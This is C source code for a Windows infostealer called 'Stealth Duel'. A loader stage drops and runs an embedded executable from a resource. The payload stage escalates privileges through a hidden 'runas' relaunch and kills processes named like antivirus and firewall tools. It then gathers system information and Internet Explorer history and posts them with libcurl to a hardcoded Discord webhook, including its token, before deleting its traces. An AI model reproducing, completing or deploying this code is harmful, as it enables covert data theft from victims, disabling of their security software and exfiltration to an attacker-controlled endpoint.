#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include "Panzer_Definitions.h"
#include "Panzer_Systeminformation.h"
#include "Processes.h"
#include "History_IE.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "libcurl.lib")

#define MAX_BUF_SIZE 4096
#define TEMP_EXECUTABLE "stealth.exe"
#define CALLING_CARD "You've been visited! Here's what I know:\n\n"

// Function forward declarations from provided snippets
int UserIsAdmin();
BOOL SetCurrentPrivilege(LPCTSTR pszPrivilege, BOOL bEnablePrivilege);
char *generalSystemInformation(char *pDataBufferAddress, int *pDataBufferSize);
char *getIEHistory(char *pBaseDirectory, char *pDataBufferAddress, int *pDataBufferSize);
int killProcessByName(char *pProcessNamePattern);

// Utility function to send data home via HTTP POST
void phoneHome(const char *data) {
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1368210146949464214/QqgJoJOeI2qzfQjqlMCVWKgHpYqCZFGlVQ9EnugixWmwaP567xQw1w7l7DEm-pqOpP93"); // Replace with your endpoint
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_error(res));
        }
        curl_easy_cleanup(curl);
    }
}

// Loader to extract and run the embedded executable
int RunLoader() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA); // Resource ID 101 for embedded exe
    if (!hRes) return 1;

    HGLOBAL hGlob = LoadResource(NULL, hRes);
    if (!hGlob) return 1;

    void *pData = LockResource(hGlob);
    if (!pData) return 1;

    DWORD size = SizeofResource(NULL, hRes);
    char tempFile[MAX_PATH];
    GetTempFileName(".", "tmp", 0, tempFile);

    HANDLE hFile = CreateFile(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD written;
    WriteFile(hFile, pData, size, &written, NULL);
    CloseHandle(hFile);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (!CreateProcess(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        DeleteFile(tempFile);
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteFile(tempFile);
    return 0;
}

// Main payload logic
int RunPayload() {
    // Step 1: Check and attempt to elevate privileges
    SetCurrentPrivilege(SE_DEBUG_NAME, TRUE);
    if (!UserIsAdmin()) {
        SHELLEXECUTEINFO sei = {0};
        sei.cbSize = sizeof(sei);
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = "runas";
        sei.lpFile = GetCommandLine(); // Relaunch self as admin
        sei.nShow = SW_HIDE;
        if (ShellExecuteEx(&sei)) {
            WaitForSingleObject(sei.hProcess, INFINITE);
            CloseHandle(sei.hProcess);
            return 0; // Exit current instance
        }
    }

    // Step 2: Kill potential security threats
    const char *threats[] = {"antivirus.exe", "firewall.exe", NULL};
    for (int i = 0; threats[i]; i++) {
        killProcessByName((char *)threats[i]);
    }

    // Step 3: Gather system information
    char sysInfo[MAX_BUF_SIZE] = {0};
    int sysInfoSize = MAX_BUF_SIZE;
    generalSystemInformation(sysInfo, &sysInfoSize);

    // Step 4: Extract IE history (adaptable to modern browsers later)
    char history[MAX_BUF_SIZE] = {0};
    int historySize = MAX_BUF_SIZE;
    char baseDir[] = "C:\\Documents and Settings"; // Adjust for target system
    getIEHistory(baseDir, history, &historySize);

    // Step 5: Compile calling card
    char callingCard[2 * MAX_BUF_SIZE] = {0};
    snprintf(callingCard, sizeof(callingCard) - 1, "%sSystem Info:\n%s\n\nIE History:\n%s",
             CALLING_CARD, sysInfo, history);

    // Step 6: Phone home with collected data
    phoneHome(callingCard);

    // Step 7: Display calling card (non-damaging, just spooky)
    MessageBox(NULL, callingCard, "Stealth Duel", MB_OK | MB_ICONINFORMATION);

    // Step 8: Cleanup (no traces left)
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    char tempFile[MAX_PATH];
    snprintf(tempFile, MAX_PATH, "%s%s", tempPath, TEMP_EXECUTABLE);
    DeleteFile(tempFile);

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Check if this is the loader or payload instance
    if (FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA)) {
        return RunLoader(); // Loader mode
    } else {
        return RunPayload(); // Payload mode
    }
}